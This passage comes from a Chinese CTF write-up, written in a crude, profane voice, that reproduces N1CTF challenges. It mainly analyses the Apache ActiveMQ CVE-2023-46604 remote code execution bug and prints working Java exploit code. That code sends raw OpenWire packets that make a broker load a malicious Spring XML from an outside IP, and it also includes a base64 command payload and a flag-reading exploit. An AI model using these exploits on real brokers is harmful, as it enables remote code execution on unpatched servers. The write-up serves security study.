class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Person</span>.RceThread(),</span><br><span class="line">                <span class="string">&quot;Rce&quot;</span>, <span class="number">0</span>, <span class="literal">false</span>);</span><br><span class="line">        thr.setDaemon(<span class="literal">true</span>);</span><br><span class="line">        thr.start();</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;john&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> <span class="string">&quot;11&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;name=&#x27;&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;&#x27;, age=&#x27;&quot;</span> + <span class="built_in">this</span>.age + <span class="string">&quot;&#x27;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8877/api/sun.print.PrintServiceLookupProvider/eyJscGNBbGxDb20iOlsidG91Y2ggL3RtcC9hYWFhYSIsInRvdWNoIC90bXAvYWFhYWEiXX0=</span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699315851001.png" alt="1699315851001"></p><p>rce 成功</p><p>md 本地 jdk 方法不太一样，调不出来，借用一下大 B 老师的图图.</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/image.png" alt="image"></p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/aaa.png" alt="aaa"></p><h2 id="gtmdapachemq"><span id="gtmdapachemq"> gtmdapachemq</span></h2><p><a href="https://exp10it.cn/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/">Apache ActiveMQ (版本 &lt; 5.18.3) RCE 分析 - X1r0z Blog (exp10it.cn)</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/17812062.html">CVE-2023-46604 activemq&lt;5.18.3 RCE 分析 - KingBridge - 博客园 (cnblogs.com)</a></p><h3 id="环境搭建"><span id="环境搭建"> 环境搭建</span></h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> apache/activemq-classic:<span class="number">5.17</span>.<span class="number">5</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install wget curl netcat -y</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">61616</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">5005</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">&quot;tail&quot;</span>,<span class="string">&quot;-f&quot;</span>,<span class="string">&quot;/dev/null&quot;</span> ]</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不多说了，5005 用于 debug 用，</p><p>找到 <code>/opt/apache-activemq/bin/linux-x86-64/wrapper.conf</code></p><p>加上一句</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wrapper.java.additional.<span class="number">14</span>=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:<span class="number">5005</span></span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/apache-activemq/bin/linux-x86-<span class="number">64</span>/activemq console</span><br></pre></td></tr></table></figure><p>👴先把 exp 放这，接着跟着👴分析这怎么个事</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.crypto.Data;</span><br><span class="line"><span class="keyword">import</span> java.io.DataOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScratchExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">61616</span>);</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">        <span class="type">DataOutputStream</span> <span class="variable">dos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(os);</span><br><span class="line">        dos.writeInt(<span class="number">0</span>);<span class="comment">// size</span></span><br><span class="line">        dos.writeByte(<span class="number">31</span>);<span class="comment">// type</span></span><br><span class="line">        dos.writeInt(<span class="number">0</span>);<span class="comment">// CommandId</span></span><br><span class="line">        dos.writeBoolean(<span class="literal">false</span>);<span class="comment">// Command response required</span></span><br><span class="line">        dos.writeInt(<span class="number">0</span>);<span class="comment">// CorrelationId</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// body</span></span><br><span class="line">        dos.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// UTF</span></span><br><span class="line">        dos.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        dos.writeUTF(<span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>);</span><br><span class="line">        dos.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        dos.writeUTF(<span class="string">&quot;http://192.168.111.1:8888/evil.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        dos.close();</span><br><span class="line">        os.close();</span><br><span class="line">        socket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span> xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="line">  &lt;bean id=<span class="string">&quot;pb&quot;</span> class=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> init-method=<span class="string">&quot;start&quot;</span>&gt;</span><br><span class="line">    &lt;constructor-arg&gt;</span><br><span class="line">      &lt;list&gt;</span><br><span class="line">        &lt;value&gt;bash&lt;/value&gt;</span><br><span class="line">        &lt;value&gt;-c&lt;/value&gt;</span><br><span class="line">        &lt;value&gt;&lt;![CDATA[touch /tmp/pwned]]&gt;&lt;/value&gt;</span><br><span class="line">      &lt;/list&gt;</span><br><span class="line">    &lt;/constructor-arg&gt;</span><br><span class="line">  &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>起个 python 的 http 服务，别跟👴说你不会哦.</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699352346466.png" alt="1699352346466"></p><h2 id="流程分析"><span id="流程分析"> 流程分析</span></h2><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699342204975.png" alt="1699342204975"></p><p>ここは断点😤</p><p>在这里会进行任意类的有参实例化，而 ApacheMQ 是基于 spring 的，所以自然会有 <code>ClassPathXmlApplicationContext</code>  这个类，我们让他进行实例化，即可完成 RCE，这个利用需要出网访问公网 ip 的恶意 xml。</p><h3 id="分析如何利用到-createthrowable"><span id="分析如何利用到-createthrowable"> 分析如何利用到 createThrowable😊</span></h3><h4 id="java-message-servicejms"><span id="java-message-servicejms"> Java Message Service(JMS)</span></h4><p>👴也不是很懂是啥玩意，反正跟服务有关吗，简单抄一下概念放上😒🤣</p><p>Java Message Service（JMS）是一种用于创建、发送、接收和管理消息的 Java API，通常用于构建分布式应用程序。JMS 是 Java EE（Enterprise Edition）规范的一部分，它提供了一种标准的方法来实现异步通信，使不同组件、应用程序和系统能够可靠地交换消息。</p><p>概念:</p><ol><li><strong>消息（Message）</strong>：JMS 消息是一种用于在应用程序之间传递信息的数据包。消息可以包含文本、字节、Map、对象等不同类型的数据。</li><li><strong>消息生产者（Message Producer）</strong>：消息生产者是负责创建和发送消息的应用程序组件。它将消息发送到消息队列或主题。</li><li><strong>消息消费者（Message Consumer）</strong>：消息消费者是负责接收和处理消息的应用程序组件。它订阅一个消息队列或主题，以接收发送到该队列或主题的消息。</li><li><strong>消息队列（Queue）</strong>：消息队列是一种点对点（Point-to-Point）通信模型，其中消息生产者将消息发送到特定队列，而消息消费者从队列接收消息。每条消息只能被一个消费者接收。</li><li><strong>主题（Topic）</strong>：主题是一种发布 / 订阅（Publish/Subscribe）通信模型，其中消息生产者将消息发送到主题，而所有订阅了该主题的消息消费者都会接收该消息。</li><li><strong>连接工厂（Connection Factory）</strong>：连接工厂是用于创建 JMS 连接的工厂对象。连接是与消息代理（如消息队列服务器）的连接，它负责管理会话和消息的传递。</li><li><strong>会话（Session）</strong>：会话是一个上下文，用于发送和接收消息。它提供了事务性和非事务性会话选项，以确保消息的可靠传递。</li><li><strong>消息代理（Message Broker）</strong>：消息代理是一个中间件组件，负责接收、存储和路由消息。常见的 JMS 消息代理包括 Apache ActiveMQ、RabbitMQ 和 IBM WebSphere MQ 等。</li></ol><p>在 JMS 中，producer client 和 consumer client 异步地向 broker 建立连接。Queue 是可消耗性的，topic 是无限的。😅</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/Oz9gyljXa5Cb3oE.png" alt="Oz9gyljXa5Cb3oE"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> javax.jms.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConnectionFactory</span> <span class="variable">connectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://localhost:61616&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> connectionFactory.createConnection();</span><br><span class="line">        connection.start();</span><br><span class="line">        <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> connection.createSession(<span class="literal">false</span>, Session.AUTO_ACKNOWLEDGE);</span><br><span class="line">        <span class="type">Destination</span> <span class="variable">destination</span> <span class="operator">=</span> session.createQueue(<span class="string">&quot;tempQueue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">MessageProducer</span> <span class="variable">producer</span> <span class="operator">=</span> session.createProducer(destination);</span><br><span class="line">        <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> session.createObjectMessage(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        producer.send(message);</span><br><span class="line"></span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先创造连接，打本地的 616 端口服务，重点在 <code>Destination destination = session.createQueue(&quot;tempQueue&quot;);</code> ：创建一个消息队列。这里使用 <code>createQueue()</code>  方法创建了一个名为 &quot;tempQueue&quot; 的队列。这是一个点对点通信模型的队列。</p><p>一般来说 <code>Producer</code>  将消息放在队列之中，允许其他应用程序或组件从该队列接收消息.</p><p>activemq 的 broker 和 client 用 OpenWire 应用层协议通信，传输层用的是 TCP 协议。</p><p>OpenWire 通信的包会在 <code>org.apache.activemq.openwire#doUnmarshal</code>  反序列化</p><p>OpenWire（也称为 ActiveMQ OpenWire）是 Apache ActiveMQ 消息代理的二进制协议，用于在消息代理和 JMS 客户端之间进行通信。它是一种紧凑的、高效的协议，旨在提供快速的消息传递性能。👴简单说到这，不想长篇大幅写了 (ఠൠఠ)ﾉ</p><p>上 tnd 断点</p><p>![1699354951791](./assets/1699354951791.png<img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699355535137.png" alt="1699355535137"></p><p>阿米诺斯，捏麻麻地报错<img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699355169986.png" alt="1699355169986"></p><p>哦，源赖氏没有这个类，ntmd 不早说</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.17</span><span class="number">.1</span>&lt;/version&gt; &lt;!-- 使用适当的版本 --&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>maven 重新加载的时候又 tmd 把自己加的依赖去掉了，重新加一下.</p><p>运行后，走到断点处</p><p>根据 dataType 指定的 DataStreamMarshaller 实现类，调用 createObject 方法。然后根据 <code>tightEncodingEnabled</code>  选择 tightUnmarshal 或 looseUnmarshal</p><p>一次 ApacheMQ 的通讯请求中会不断的有 marshal 和 dounmarshal 的操作</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699356385920.png" alt="1699356385920"></p><p>而 <code>ExceptionResponseMarshaller</code>  有 <code>tightUnmarhsal</code>  方法，会进入其 <code>tightUnmarhsal</code>  方法，是 <code>BaseDataStreamMarshaller</code>  的子类</p><p>什么？你问什么是 <code>BaseDataStreamMarshaller</code> ? 不就是最终漏洞利用点的地方吗.</p><p><code>ExceptionResponseMarshaller#looseUnmarshal</code>  会调用 looseUnmarsalThrowable，从而调用 <code>org.apache.activemq.openwire.v12.BaseDataStreamMarshaller#createThrowable</code>  到达漏洞利用点.</p><p>捏麻麻地，好√Ⅷ 难调，nmd 一次还有时间限制</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699357487163.png" alt="1699357487163"></p><p>走到 <code>looseUnmarsalThrowable</code></p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699358236329.png" alt="1699358236329"></p><p>这里就进入了恶意方法，至此，我们需要控制 <code>clazz</code>  和 <code>message</code></p><p>因为 ExceptionResponseMarshaller 也有  <code>marshal</code>  方法，所以就研究如何去发送一个经由这个 marshaller 处理的  <code>ExceptionResponse</code></p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699361719795.png" alt="1699361719795"></p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699362221605.png" alt="1699362221605"></p><p><code>oneway</code>  方法会调用  <code>wireFormat.marshal()</code>  去序列化 command</p><p>command 就是前面准备发送的  <code>ObjectMessage</code> , 而 wireFormat 就是和它对应的序列化器</p><p>那么我们只需要手动 patch 这个方法，将 command 改成 ExceptionResponse, 将 wireFormat 改成 ExceptionResponseMarshaller 即可</p><p><code>this.wireFormat.marshal(command, this.dataOut);</code>  我们在这里手动 patch 其中 command 为 CPX 类，我们的做法很简单，也只需要写一个相同的包名，这样由于方法调用机制，会优先寻找我们重写的类，然后调用其中的 onway 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">oneway</span><span class="params">(Object command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="built_in">this</span>.checkStarted();</span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;http://8.130.24.188:8000/rce.xml&quot;</span>);</span><br><span class="line">    <span class="type">ExceptionResponse</span> <span class="variable">exceptionResponse</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionResponse</span>(context);</span><br><span class="line">    <span class="built_in">this</span>.wireFormat.marshal(exceptionResponse, <span class="built_in">this</span>.dataOut);</span><br><span class="line">    <span class="built_in">this</span>.dataOut.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.springframework.context.support;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassPathXmlApplicationContext</span> <span class="keyword">extends</span> <span class="title class_">Throwable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClassPathXmlApplicationContext</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意重写 getMedssage，这是为了让服务端获取到 message，也就是实例化参数）继承 Throwable 是因为 ExceptionResponse 需要 Exception 类型，我们只是需要他的类名和传参。然后服务端会根据这 2 个值进行实例化.</p><p>真√Ⅷ 恶心，太难调了，老是掉连接.</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699367131598.png" alt="1699367131598"></p><p>会进行本地序列化，直接改方法</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699403992353.png" alt="1699403992353"></p><p>算了，根据文档，打一个 sock 协议<a href="https://activemq.apache.org/openwire-version-2-specification"> ActiveMQ (apache.org)</a>😅</p><h2 id="打-tmd-题目"><span id="打-tmd-题目"> 打 tmd 题目😡</span></h2><p>nmd 题目反代不让出网，完全利用不了.😅</p><p>肖健仁！！！😡, 题目既然还有一个挂 GSON 的机子，👴就打 tmd 的 SSRF😤</p><p>参考 NESE 爹的 exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> javax.jms.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> <span class="keyword">implements</span> <span class="title class_">MessageListener</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">publish</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        javax.jms.ConnectionFactory factory;</span><br><span class="line">        factory = <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://127.0.0.1:61616&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> factory.createConnection();</span><br><span class="line">        <span class="type">Session</span> <span class="variable">pubSession</span> <span class="operator">=</span> connection.createSession(<span class="literal">false</span>, Session.AUTO_ACKNOWLEDGE);</span><br><span class="line">        <span class="type">Queue</span> <span class="variable">queue</span> <span class="operator">=</span> pubSession.createQueue(<span class="string">&quot;flagqueue&quot;</span>);</span><br><span class="line">        <span class="type">MessageProducer</span> <span class="variable">publisher</span> <span class="operator">=</span> pubSession.createProducer(queue);</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cat /flag&quot;</span>&#125;;</span><br><span class="line">        <span class="type">byte</span>[] bs = <span class="keyword">new</span> <span class="title class_">Scanner</span>(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).start().getInputStream())</span><br><span class="line">                .useDelimiter(<span class="string">&quot;\\A&quot;</span>)</span><br><span class="line">                .next()</span><br><span class="line">                .getBytes();</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bs);</span><br><span class="line">        <span class="type">TextMessage</span> <span class="variable">msg</span> <span class="operator">=</span> pubSession.createTextMessage();</span><br><span class="line">        msg.setText(message);</span><br><span class="line">        publisher.send(msg);</span><br><span class="line">        System.out.println(<span class="string">&quot;publish finished&quot;</span>);</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">consume</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ConnectionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://xxx:61616&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> factory.createConnection();</span><br><span class="line">        <span class="type">Session</span> <span class="variable">subSession</span> <span class="operator">=</span> connection.createSession(<span class="literal">false</span>, Session.AUTO_ACKNOWLEDGE);</span><br><span class="line">        <span class="type">Queue</span> <span class="variable">queue</span> <span class="operator">=</span> subSession.createQueue(<span class="string">&quot;flagqueue&quot;</span>);</span><br><span class="line">        <span class="type">MessageConsumer</span> <span class="variable">subscriber</span> <span class="operator">=</span> subSession.createConsumer(queue);</span><br><span class="line">        subscriber.setMessageListener(<span class="built_in">this</span>);</span><br><span class="line">        connection.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">main</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">         main.publish();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(Message message)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Received &quot;</span> + ((TextMessage) message).getText());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过这个文件读 flag, 从文件  <code>/flag</code>  读取内容，并将其作为文本消息发送到名为 “flagqueue” 的 ActiveMQ 消息队列中。这使得其他应用程序可以订阅 “flagqueue” 队列来接收消息。</p><p>改一下 oneway, 通过这个去 SSRF 的 GSON</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">oneway</span><span class="params">(Object command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="built_in">this</span>.checkStarted();</span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span 